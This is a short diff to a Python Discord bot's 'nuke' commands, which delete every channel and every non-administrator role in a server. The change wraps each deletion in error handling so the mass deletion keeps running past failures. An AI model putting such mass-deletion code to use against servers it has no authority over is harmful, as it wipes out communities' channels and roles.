@@ -42,7 +42,10 @@ class NukeCommands(commands.GroupCog, name="nuke", description="Nuke commands"):
             return
 
         for channel in interaction.guild.channels:
-            await channel.delete()
+            try:
+                await channel.delete()
+            except Exception as e:
+                print(e)
 
     @discord.app_commands.command(
         name="roles",
@@ -54,7 +57,10 @@ class NukeCommands(commands.GroupCog, name="nuke", description="Nuke commands"):
 
         for role in interaction.guild.roles:
             if not (role.permissions.administrator or role.name == "@everyone"):
-                await role.delete()
+                try:
+                    await role.delete()
+                except Exception as e:
+                    print(e)
 
         await interaction.response.send_message("💥", ephemeral=True)
 
